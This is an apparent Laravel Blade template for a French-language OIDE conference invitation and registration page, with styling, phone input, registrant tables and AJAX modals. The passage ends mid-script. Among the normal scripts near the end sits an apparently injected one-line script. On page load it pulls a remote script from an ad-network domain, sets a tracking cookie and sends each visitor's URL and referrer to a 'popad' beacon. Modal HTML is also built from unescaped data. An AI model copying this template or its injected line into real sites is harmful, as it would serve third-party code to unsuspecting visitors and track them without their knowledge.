<!DOCTYPE html>
<html lang="fr-FR" class="wf-roboto-n4-active wf-robotoslab-n1-active wf-robotoslab-n3-active wf-robotoslab-n4-active wf-active js csstransforms csstransforms3d csstransitions js_active  vc_desktop  vc_transform  vc_transform skrollr skrollr-desktop" style="height: auto;">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="profile" href="#">
    <link rel="pingback" href="#">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="profile" href="//gmpg.org/xfn/11">
    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
    <link rel="shortcut icon" href="{{asset('images/logos/oide.png')}}" width="500px" type="image/x-icon">
    <title>Invitation - Pré-Conférence OIDE</title>
    <style type="text/css">
        img.wp-smiley,
        img.emoji {
            display: inline !important;
            border: none !important;
            box-shadow: none !important;
            height: 1em !important;
            width: 1em !important;
            margin: 0 .07em !important;
            vertical-align: -0.1em !important;
            background: none !important;
            padding: 0 !important;
        }

        button:disabled {
          background-color: #CCCCCC;
          cursor: default;
       }


        .iti {
            width: calc(100% - 40px); /* Prendre 100% de la largeur moins la largeur du bouton */
        }

        .input-group-append {
            position: absolute; /* Positionner le bouton absolument */
            right: 0;
            top: 0;
            background-color: Grey;
            height: 84%;
            width: 40px; /* Largeur du bouton */
        }

        .btn-contact {
            height: 100%;
            width: 100%;
            display: flex;
            color: white;
            align-items: center;
            justify-content: center;
            margin: 15px;
            font-size: 20px; /* Taille de la police de l'icône */
        }
        /* Style pour le conteneur de traduction */
        #traduction_site_web {
            position: fixed;
            top: 50%;
            left: 0;
            transform: translateY(-50%);
            z-index: 1000;
            padding: 5px;
            border-radius: 3px;
            background-color: #fff;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            font-family: Arial, sans-serif;
            transition: box-shadow 0.3s ease;
            font-size: 12px;
            width: auto;
            text-align: center;
        }

        #traduction_site_web:hover #traduction_button {
            display: block;
        }

        #traduction_site_web:hover #dropdown_menu {
            display: block;
        }

        /* Style pour le bouton */
        #traduction_button {
            display: none;
            background-color: #007bff;
            color: white;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 3px;
            position: relative;
            font-size: 12px;
            transition: background-color 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #dropdown_logo {
            margin-left: 5px;
            font-size: 10px;
        }

        #traduction_button:hover {
            background-color: #0056b3;
        }

        /* Style pour le menu déroulant */
        #dropdown_menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            background-color: #fff;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border-radius: 3px;
            z-index: 1001;
            width: 150px;
            padding: 5px;
            margin-top: 5px;
        }

        /* Style pour les éléments du menu déroulant */
        .dropdown_item {
            padding: 5px;
            cursor: pointer;
            border-bottom: 1px solid #f1f1f1;
            font-size: 12px;
        }

        .dropdown_item:last-child {
            border-bottom: none;
        }

        .dropdown_item:hover {
            background-color: #f1f1f1;
        }

        /* Masquer le logo Google et le texte "Fourni par Google" */
        .goog-logo-link,
        .goog-te-gadget span {
            display: none !important;
        }

        /* Masquer les styles inline pour le gadget Google Translate */
        .goog-te-gadget {
            color: transparent !important;
        }

        .goog-te-gadget .goog-te-combo {
            color: #000 !important;
            padding: 5px;
            border: 1px solid #ccc;
            border-radius: 3px;
            width: 100%;
            box-sizing: border-box;
        }

    </style>
    <link rel="stylesheet" id="vc_tta_style-css" href="{{asset('css/js_composer_tta.min.css')}}" type="text/css" media="all">
    <link rel='stylesheet' id='simple_tooltips_style-css' href="{{asset('css/zebra_tooltips.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='wp-block-library-css' href="{{asset('css/style.min.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='contact-form-7-css' href="{{asset('css/styles.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='flowplayer-css-css' href="{{asset('css/skin.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='rs-plugin-settings-css' href="{{asset('css/settings.css')}}" type='text/css' media='all' />
    <style id='rs-plugin-settings-inline-css' type='text/css'>
        #rs-demo-id {}
    </style>
    <link rel='stylesheet' id='zilla-likes-css' href="{{asset('css/zilla-likes.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='trp-language-switcher-style-css' href="{{asset('css/trp-language-switcher.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='font-awesome-css' href="{{asset('css/font-awesome.min.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='bootstrap-css' href="{{asset('css/bootstrap.min.css')}}" type='text/css' media='all' />
    {{-- <link rel='stylesheet' id='flaticon-css' href="{{asset('css/flaticon.css')}}" type='text/css' media='screen' /> --}}
    <link rel='stylesheet' id='nominee-plugins-css' href="{{asset('css/plugins.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='stylesheet-css' href="{{asset('css/style.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='nominee-responsive-css-css' href="{{asset('css/responsive.min.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='nominee-custom-style-css'  href="{{asset('css/custom-style.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='mc4wp-form-basic-css' href="{{asset('css/form-basic.min.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='js_composer_front-css' href="{{asset('css/js_composer.min.css')}}" type='text/css' media='all' />
    <link rel='stylesheet' id='jetpack_css-css' href="{{asset('css/jetpack.css')}}" type='text/css' media='all' />
    {{-- Our css --}}
    {{--<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">--}}
    <link rel="stylesheet" href="{{asset('css/animate.css')}}">
    {{-- /Our css --}}

    <link rel="stylesheet" href="{{asset('table/css/buttons.bootstrap4.min.css')}}">
    <link rel="stylesheet" href="{{asset('table/css/responsive.bootstrap4.min.css')}}">
    <link rel="stylesheet" href="{{asset('datatable/css/dataTables.bootstrap.min.css')}}">
    <link rel="stylesheet" href="{{asset('datatable/css/dataTables.bootstrap4.min.css')}}">

    <link rel="stylesheet" href="{{asset('toastr/toastr.min.css')}}">
    <link rel="stylesheet" href="{{asset('sweetalert2/sweetalert2.min.css')}}">

<!-- EFFACER-->



<!-- FIN EFFACER-->

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">

    <script src="{{asset('js/jquery.js')}}" defer="defer" type="text/javascript"></script>

    <script src="{{asset('js/jquery-migrate.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/flowplayer.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/jquery.themepunch.tools.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/jquery.themepunch.revolution.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/fontawesomes.js')}}" type="text/javascript"></script>

    <script src="{{asset('js/zilla-likes.js')}}" defer="defer" type="text/javascript"></script>
    <link href="https://cdn.jsdelivr.net/npm/chart.js@2.9.4/dist/Chart.min.css" rel="stylesheet">
    
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />

    <style>
        .select2-container{
            display: block !important;
            width: 100% !important;
        }
    </style>
    
    
    <meta name="generator" content="Powered by Slider Revolution 5.4.8 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
    <script type="text/javascript">function setREVStartSize(e){
    						try{ e.c=jQuery(e.c);var i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;
    							if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})
    						}catch(d){console.log("Failure at Presize of Slider:"+d)}
    					};</script>
    @include('include.styles')
    <noscript>
        <style type="text/css">
            .wpb_animate_when_almost_visible {
                opacity: 1;
            }
        </style>
    </noscript>


</head>

<body id="home" class="page-template page-template-page-templates page-template-template-vc page-template-page-templatestemplate-vc-php page page-id-2539 wp-embed-responsive translatepress-fr_FR header-transparent has-header-topbar fullwidth-layout wpb-js-composer js-comp-ver-5.5.5 vc_responsive elementor-default" data-spy="scroll" data-target=".navbar" data-offset="100">

  <div id="preloader" class="preloader">

      <div class="status-mes" style="background-image: url(https://oide-gouv.org/wp-content/uploads/2015/12/spin.gif);"></div>

  </div>

    <div class="site-wrapper">
        <nav class="navbar navbar-default navbar-fixed-top">
            <div class="header-top-wrapper">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-5 col-md-6">
                            <div class="news-ticker-wrapper">
                                <span><i class="fa fa-rss"></i> Info de l'OIDE : </span>

                                <ul class="news-ticker">

                                    <li><a href="#">OIDE : Conférence de presse de L'OIDE</a></li>
                                    <li><a href="#">OIDE : Président Exécutif Mondial, SE LOUIS KOFFI LAOURE</a></li>
                                    <li><a href="#">OIDE : Site Pour les invitations</a></li>
                                </ul>

                            </div>
                        </div>

                        <div class="col-sm-7 col-md-6 pull-right hidden-xs">
                            <div class="contact-info hidden-sm">
                                <ul>
                                    <li><a href="tel:+22520312570">+225 20 31 25 70</a></li>
                                    <li><a href="mailto:info@oide-gouv.org">info@oide-gouv.org</a></li>
                                    <li>
                                      @auth
                                      <a href="{{ route('logout') }}" onclick="event.preventDefault(); document.getElementById('logout-form').submit();" class="btn btn-danger" style="color : white">Déconnexion</a>
                                      <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                             {{ csrf_field() }}
                                      </form>
                                      @endauth
                                  </li>

                                </ul>
                            </div>
                        </div> <!-- .col-# -->
                    </div> <!-- .row -->
                </div> <!-- .container -->
            </div> <!-- .header-top-wrapper -->
            <div class="container">
                <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
                    <div class="mobile-donate-button pull-right visible-xs">
                        @auth
                        <a href="{{ route('logout') }}" onclick="event.preventDefault(); document.getElementById('logout-form').submit();" class="btn btn-danger" style="color : white"><i class="fa fa-sign-out"></i></a>
                        <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                               {{ csrf_field() }}
                        </form>
                        @endauth

                    </div>

                    <button type="button" class="navbar-toggle" data-toggle="collapse" style="color : white" data-target="#mobile-toggle">
                        <i class="fa fa-user-circle-o"></i>
                    </button>

                    <div class="navbar-brand">
                        <h1>
                            <a href="#" title="OIDE">
                                <img class="hidden-xs" src="{{asset('images/logos/logo-oide.png')}}" style="width: 250px" alt="OIDE" />
                                <img class="visible-xs" src="{{asset('images/logos/logo-oide.png')}}" style="width: 250px" alt="OIDE" />
                            </a>
                        </h1>
                    </div> <!-- .navbar-brand -->
                </div> <!-- .navbar-header -->

                <div class="main-menu-wrapper hidden-xs">
                    <div class="main-menu">
                        <div class="donate-button pull-right">
                           @auth
                            <a href="#">Administrateur</a>
                           @endauth

                        </div>

                        <ul id="menu-oide" class="menu nav navbar-nav navbar-right">

                       </ul>

                    </div>
                    </div>
                </div> <!-- /navbar-collapse -->

                <!-- Collect the nav links, forms, and other content for toggling -->

            </div><!-- .container-->
        </nav>
        <div id="traduction_site_web">
            <button id="traduction_button">Traduire<span id="dropdown_logo">▼</span></button>
            <div id="dropdown_menu">
                <div id="google_translate_element"></div>
            </div>
        </div>
        @yield('content')

        <footer class="footer-section footer-multi-wrapper">

            <div class="container">
                <div class="row">
                    <div class="tt-sidebar-wrapper footer-sidebar clearfix text-left" role="complementary">
                        <div id="black-studio-tinymce-1" class="col-md-3 col-sm-6 widget widget_black_studio_tinymce">
                            <h3 class="widget-title">OIDE - IOED</h3>
                            <div class="textwidget">
                                <p>L’OIDE, est une institution de financement de développement rattachée aux Etats par des accords de siège (statut particulier et d’extraterritorialité), dont sont dépositaires les Ministères des affaires Etrangères des différents pays engagés dans des relations de développement avec l’OIDE.</p>
                            </div>
                        </div>
                        <div id="nav_menu-3" class="col-md-3 col-sm-6 widget widget_nav_menu">
                            <h3 class="widget-title">Conférence OIDE</h3>
                            <div class="menu-acces-rapide-container">
                                <ul id="menu-acces-rapide" class="menu">
                                    <li id="menu-item-3666" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-3461 current_page_item menu-item-3666"><a href="" aria-current="page">Invitation OIDE</a></li>
                                </ul>
                            </div>
                        </div>
                        <div id="custom_html-6" class="widget_text col-md-3 col-sm-6 widget widget_custom_html">
                            <h3 class="widget-title">Contacts</h3>
                            <div class="textwidget custom-html-widget">
                                <ul>
                                    <li><i class="fa fa-map-marker"></i>Avenue Lamblin, Plateau tour BIAO, 12ème étage Abidjan Plateau</li>
                                    <li><i class="fa fa-phone" href="tel:+22520312570"></i>+225 20 31 25 70</li>
                                    <li><i class="fa fa-envelope" href="mailto:info@oide-gouv.org"></i>info@oide-gouv.org</li>
                                </ul>
                            </div>
                        </div>
                        <div id="custom_html-7" class="widget_text col-md-3 col-sm-6 widget widget_custom_html">
                            <h3 class="widget-title">Logo</h3>
                            <div class="textwidget custom-html-widget">
                                <script>(function() {
                                        	if (!window.mc4wp) {
                                        		window.mc4wp = {
                                        			listeners: [],
                                        			forms    : {
                                        				on: function (event, callback) {
                                        					window.mc4wp.listeners.push({
                                        						event   : event,
                                        						callback: callback
                                        					});
                                        				}
                                        			}
                                        		}
                                        	}
                                        })();
                                        </script><!-- Mailchimp for WordPress v4.5.2 - https://wordpress.org/plugins/mailchimp-for-wp/ -->
                            </div>
                        </div>
                        <div id="media_image-2" class="col-md-3 col-sm-6 widget widget_media_image"><a href="https://oide-gouv.org/"><img width="150" height="150" src="{{asset('images/logos/oide.png')}}" class="image wp-image-4903  attachment-full size-full"
                                  alt="" style="max-width: 100%; height: auto;" srcset="{{asset('images/logos/oide.png')}}" /></a></div>
                    </div>
                </div>
            </div> <!-- .container -->

            <div class="footer-copyright">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-6">
                            <div class="copyright">
                                  OIDE IOED | © 2024 Tous droits réservés.
                            </div> <!-- .copyright -->
                        </div> <!-- .col-# -->

                        <div class="col-sm-6">
                            <div class="social-links-wrap text-right">
                                <div class="footer-social-links social-links">
                                    <ul class="list-inline">
                                        <li><a href="" target="_blank"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#" target="_blank"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#" target="_blank"><i class="fa fa-pinterest"></i></a></li>
                                    </ul>
                                </div>
                            </div> <!-- /social-links-wrap -->
                        </div>
                    </div> <!-- .row -->
                </div> <!-- .container -->
            </div> <!-- .footer-copyright -->
        </footer> <!-- .footer-section -->
        <!-- newsletter subscription popup -->
    </div> <!-- .site-wrapper -->

    @include('modal.envoi_mail')
    
    @include('modal.lieu_touristik')

    <link rel='stylesheet' id='vc_google_fonts_roboto_slab100300regular700-css' href='https://fonts.googleapis.com/css?family=Roboto+Slab%3A100%2C300%2Cregular%2C700' type='text/css' media='all' />
    <script src="{{asset('js/zebra_tooltips.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/photon.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/scripts.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/devicepx-jetpack.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/plugins.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/jquery.news-ticker.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/imagesloaded.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/masonry.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/jquery.masonry.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/vc-accordion.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/vc-tabs.min.js')}}" defer="defer" type="text/javascript"></script>


<!-- A EFFACER -->
    <script src="{{asset('bower_components/jquery/dist/jquery.min.js')}}"></script>
    <!-- jQuery UI 1.11.4 -->
    <script src="{{asset('bower_components/jquery-ui/jquery-ui.min.js')}}"></script>
    <!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->

    <script src="{{asset('bower_components/bootstrap/dist/js/bootstrap.js')}}"></script>

<!-- A EFFACER -->
    <script type='text/javascript'>
        /* <![CDATA[ */
        var nomineeJSObject = {
            "is_front_page": "1",
            "nominee_news_ticker": "1",
            "count_day": "Days",
            "count_hour": "Hour",
            "count_minutes": "Minutes",
            "count_second": "Second",
            "newsletter_popup": "0",
            "newsletter_popup_limit": "",
            "newsletter_popup_time": "3",
            "ajaxurl": "https:\/\/www.oide-gouv.org\/wp-admin\/admin-ajax.php",
            "redirecturl": "http:\/\/box5734.temp.domains\/~oidegouv\/",
            "loadingmessage": "Sending user info, please wait..."
        };
        /* ]]> */
    </script>
    <script src="{{asset('js/scripts_2.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/wp-embed.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/js_composer_front.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/skrollr.min.js')}}" defer="defer" type="text/javascript"></script>
    <script src="{{asset('js/modal.js')}}" defer="defer" type="text/javascript"></script>


    <script src="{{asset('toastr/toastr.min.js')}}"></script>
    <script src="{{asset('sweetalert2/sweetalert2.min.js')}}"></script>

    <script src="{{asset('datatable/js/jquery.dataTables.min.js')}}"></script>
    <script src="{{asset('datatable/js/dataTables.bootstrap4.min.js')}}"></script>
    <script src="{{asset('datatable/js/dataTables.buttons.min.js')}}"></script>
    <script src="{{asset('table/js/dataTables.buttons.min.js')}}"></script>
    <script src="{{asset('table/js/buttons.bootstrap4.min.js')}}"></script>
    <script src="{{asset('table/js/jszip.min.js')}}"></script>
    <script src="{{asset('table/js/pdfmake.min.js')}}"></script>
    <script src="{{asset('table/js/vfs_fonts.js')}}"></script>
    <script src="{{asset('table/js/buttons.html5.min.js')}}"></script>
    <script src="{{asset('table/js/buttons.print.min.js')}}"></script>
    <script src="{{asset('table/js/buttons.colVis.min.js')}}"></script>
    <script src="{{asset('table/js/dataTables.responsive.min.js')}}"></script>
    <script src="{{asset('table/js/responsive.bootstrap4.min.js')}}"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

    <script>
    const phoneInputField = document.querySelector("#phone");
    const phoneInput = window.intlTelInput(phoneInputField, {
        initialCountry: "auto",
        geoIpLookup: function(callback) {
            fetch('https://ipinfo.io/json', { headers: { 'Accept': 'application/json' }})
                .then(response => response.json())
                .then(data => callback(data.country))
                .catch(() => callback('us'));
        },
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
        separateDialCode: false, // Garder le drapeau visible
    });

    // Prevent hiding the dropdown when clicking inside the input field
    phoneInputField.addEventListener("click", function(event) {
        event.stopPropagation();
        phoneInput.openDropdown();
    });

    document.querySelector("form").addEventListener("click", function(event) {
        event.stopPropagation();
    });

    document.addEventListener("click", function(event) {
        phoneInput.closeDropdown();
    });

    phoneInputField.addEventListener("countrychange", function() {
        const selectedCountryData = phoneInput.getSelectedCountryData();
        phoneInputField.value =   "(" + "+" + selectedCountryData.dialCode + ")";
        phoneInputField.focus();
    });

    document.querySelector("form").addEventListener("submit", function(event) {
        event.preventDefault();
        const phoneNumber = phoneInput.getNumber();
        console.log("Formatted phone number:", phoneNumber);
        // Submit the form data via AJAX or your preferred method here
    });

</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
    <script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="//deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='//www.oide-gouv.org/pages/imevrstk.php?qd=IBL&zqd=015.005&nbid=ed9950ec00226e4305b28dc4b5926c29&cid=295720&at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>



          <script>
          var slideIndex = 1;
          showDivs(slideIndex);

          function plusDivs(n) {
          showDivs(slideIndex += n);
          }

          function currentDiv(n) {
          showDivs(slideIndex = n);
          }

          function showDivs(n) {
          var i;
          var x = document.getElementsByClassName("mySlides");
          var dots = document.getElementsByClassName("demo");
          if (n > x.length) {slideIndex = 1}
          if (n < 1) {slideIndex = x.length}
          for (i = 0; i < x.length; i++) {
          x[i].style.display = "none";
          }
          for (i = 0; i < dots.length; i++) {
          dots[i].className = dots[i].className.replace(" w3-white", "");
          }
          x[slideIndex-1].style.display = "block";
          dots[slideIndex-1].className += " w3-white";
          }
          </script>
          <script>
          var myIndex = 0;
          carousel();

          function carousel() {
          var i;
          var x = document.getElementsByClassName("mySlides");
          for (i = 0; i < x.length; i++) {
          x[i].style.display = "none";
          }
          myIndex++;
          if (myIndex > x.length) {myIndex = 1}
          x[myIndex-1].style.display = "block";
          setTimeout(carousel, 5000); // Change image every 2 seconds
          }
          </script>

          <script type="text/javascript">

          $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
          });

            $(function(){
               //AJOUT INSCRIT
             $('#inscription-form').on('submit', function(e){
                 e.preventDefault();

                 $.ajax({
                   url:$(this).attr('action'),
                   method:$(this).attr('method'),
                   data:new FormData(this),
                   processData:false,
                   dataType:'json',
                   contentType:false,
                   beforeSend:function(){
                     $(document).find('span.error-text').text('');
                   },
                   success:function(data){
                     if(data.status == 0){
                       $.each(data.error, function(prefix, val){
                         $('span.'+prefix+'_error').text(val[0]);
                       });
                     }else{
                       $('#inscription-form')[0].reset();
                       toastr.success(data.msg);
                       // Faire disparaître le div #siteDetails
                       $('#siteDetails').hide();
                       $('#touristSection').hide();
                     }
                   }
                 });
             });


             //GET ALL INSCRIT ET AFFICHAGE DANS LE DATATABLE

             var table = $('#inscrit-table').DataTable({
                 processing:true,
                 info:true,
                 ajax:"{{ route('get.inscrit.list') }}",
                 "pageLength":5,
                 responsive: true,
                 "bAutoWidth": false,
                 "aLengthMenu":[[5,10,25,50,-1],[5,10,25,50,"Tout"]],
                 columns:[
                     {data:'DT_RowIndex', name:'DT_RowIndex'},
                     {data:'civilite', name:'civilite'},
                     {data:'nom', name:'nom'},
                     {data:'prenoms', name:'prenoms'},
                     {data:'genre', name:'genre'},
                     {data:'email', name:'email'},
                     {data:'numero_tel', name:'numero_tel'},
                     {data:'pays_residence', name:'pays_residence'},
                     {data:'inscription_tant_que', name:'inscription_tant_que'},
                     {data:'langue_com', name:'langue_com'},
                     {data:'nationalite', name:'nationalite'},
                     {
                          data: 'created_at',
                          name: 'created_at',
                          render: function(data, type, row) {
                              return moment(data).format('DD/MM/YYYY HH:mm:ss');
                          }
                      },
                     {data:'lieu_touristique', name:'lieu_touristique'},
                     {data:'etat', name:'etat'},
                     {data:'actions', name:'actions', orderable:false, searchable:false},
                 ],
                 language: {
                      "decimal": ",",
                      "emptyTable": "Aucune donnée disponible dans le tableau",
                      "info": "Affichage de _START_ à _END_ sur _TOTAL_ entrées",
                      "infoEmpty": "Affichage de 0 à 0 sur 0 entrées",
                      "infoFiltered": "(filtré à partir de _MAX_ entrées totales)",
                      "infoPostFix": "",
                      "thousands": " ",
                      "lengthMenu": "Afficher _MENU_ entrées",
                      "loadingRecords": "Chargement...",
                      "processing": "Traitement...",
                      "search": "Rechercher:",
                      "zeroRecords": "Aucun enregistrement correspondant trouvé",
                      "paginate": {
                          "first": "Premier",
                          "last": "Dernier",
                          "next": "Suivant",
                          "previous": "Précédent"
                      },
                      "aria": {
                          "sortAscending": ": activer pour trier la colonne par ordre croissant",
                          "sortDescending": ": activer pour trier la colonne par ordre décroissant"
                      }
                  }
             }).on('draw', function(){
                 $('input[name="inscrit_checkbox"]').each(function(){this.checked = false;});
                 $('input[name="main_checkbox"]').prop('checked', false);
                 $('button#deleteAllBtn').addClass('d-none');
             });

            //MODAL FENETRE AFFICHAGE CONTENANT L'ID DE LA LIGNE A MODIFIE

             $(document).on('click','#editInscritBtn',function(){
               var inscrit_id = $(this).data('id');
               var url = '{{route("get.inscrit.detail")}}';
               $.post(url,{inscrit_id:inscrit_id}, function(data){
              //toastr.success(data.inscrits.id);
                 var doc_modal = $('.addmail');
                 $(doc_modal).find('form').find('input[name="cid"]').val(data.inscrits.id);
                 $(doc_modal).find('strong.civiliteinscrit').text(data.inscrits.civilite);
                 $(doc_modal).find('strong.nominscrit').text(data.inscrits.nom);
                 $(doc_modal).find('strong.prenominscrit').text(data.inscrits.prenoms);
                 $(doc_modal).modal('show');
                },'json');
             });

             //MODAL FENETRE AFFICHAGE CONTENANT L'ID DE LA LIGNE A MODIFIE

              $(document).on('click','#lieu_touristik',function(){
                var inscrit_id = $(this).data('id');
                var url = '{{route("get.lieu_touristik.detail")}}';
                $.post(url,{inscrit_id:inscrit_id}, function(data){
               //toastr.success(data.inscrits.id);
                  var doc_modal = $('.touristik');
                  $(doc_modal).find('form').find('input[name="cid"]').val(data.inscrits.id);
                  $(doc_modal).find('strong.civiliteinscrit').text(data.inscrits.civilite);
                  $(doc_modal).find('strong.nominscrit').text(data.inscrits.nom);
                  $(doc_modal).find('strong.prenominscrit').text(data.inscrits.prenoms);

                  // Effacer les éléments précédents de la liste des lieux touristiques
                  $('#tourist-list').empty();

                  // Ajouter les lieux touristiques choisis à la liste
                  data.inscrits.sites_touristiques.forEach(function(site) {
                    var imageUrl = '{{ asset('images/tourisme') }}/' + site.image;
                    var siteHtml = '<li class="list-group-item">';
                    siteHtml += '<strong style="font-size : 15px">' + site.name + '</strong>';
                    siteHtml += '<img src="' + imageUrl + '" alt="' + site.name + '" style="width: 90px; height: 90px; margin-right: 10px;">';
                    siteHtml += '<div>' + site.description + '</div>';
                    siteHtml += '<span class="badge badge-primary badge-pill" style="float: right; margin-top: 5px;">' + site.price + '</span>';
                    siteHtml += '</li>';
                    $('#tourist-list').append(siteHtml);
                  });

                  $(doc_modal).modal('show');
                 },'json');
              });

              //Modal Fenetre Affichage Infos de la conference
              $(document).on('click', '#conferenceModal', function(){
                let inscrit_id = $(this).data('id')
                const url = '{{ route('get.conference.detail') }}'
                $.post(url, {
                    inscrit_id: inscrit_id
                }, function(data){
                    const modal = $('.modal_conference')

                    $(modal).find('strong.civiliteinscrit').text(data.inscrits.civilite)
                    $(modal).find('strong.nominscrit').text(data.inscrits.nom);
                    $(modal).find('strong.prenominscrit').text(data.inscrits.prenoms);

                    $('#conference-list').empty();

                    const conferences = data.inscrits.conferences

                    if (conferences.length == 0) {
                        var conferenceHtml = '<li class="list-group-item">';
                        conferenceHtml += '<div style="font-size : 15px; text-align: center; font-weight: bold">Aucune conférence</div>';
                        conferenceHtml += '</li>';
                        $('#conference-list').append(conferenceHtml);
                    }else{
                        data.inscrits.conferences.forEach(function(conference){
                            const moderateur = conference.moderateur !== null ? conference.moderateur : 'Aucun'
                            const mode = conference.mode !== null ? conference.mode : 'Aucun'
                            var conferenceHtml = '<li class="list-group-item">';
                            conferenceHtml += '<strong style="font-size : 15px">' + conference.theme + '</strong><br>';
                            conferenceHtml += '<strong> Mode</strong> : ' + mode + ' <br>';
                            conferenceHtml += '<strong> Modérateur</strong> : ' + moderateur + ' <br>';
                            conferenceHtml += '<strong> Du </strong> : <span class="badge badge-primary badge-pill" style="float: none !important">' + conference.debut + '</span><br>';
                            conferenceHtml += '<strong> Au </strong> :<span class="badge badge-primary badge-pill" style="float: none !important">' + conference.fin + '</span><br>';
                            conferenceHtml += '</li>';
                            $('#conference-list').append(conferenceHtml);
                        })
                    }


                    $(modal).modal('show');
                })


              })

             //UPDATE ETAT INSCRIT
             // UPDATE ETAT INSCRIT

              $('#edit-inscrit-form').on('submit', function(e){
                  e.preventDefault();

                  var $submitButton = $('#editInscritBtn');
                  var $loadingIndicator = $('#loadingIndicator');

                  // Désactiver le bouton de soumission immédiatement après le clic
                  $loadingIndicator.show();

                  // Lorsque le curseur survole le bouton, masquer le curseur de la main
                  // Appliquer le style de curseur par défaut
                  $submitButton.css('cursor', 'default');

                  var submitButton = document.getElementById('submitButton');

                  // Disable the submit button
                  submitButton.disabled = true;
                  submitButton.textContent = 'En cours...';

                  // Change cursor to default when the button is disabled
                  submitButton.style.cursor = 'default';

                  $.ajax({
                      url: $(this).attr('action'),
                      method: $(this).attr('method'),
                      data: new FormData(this),
                      processData: false,
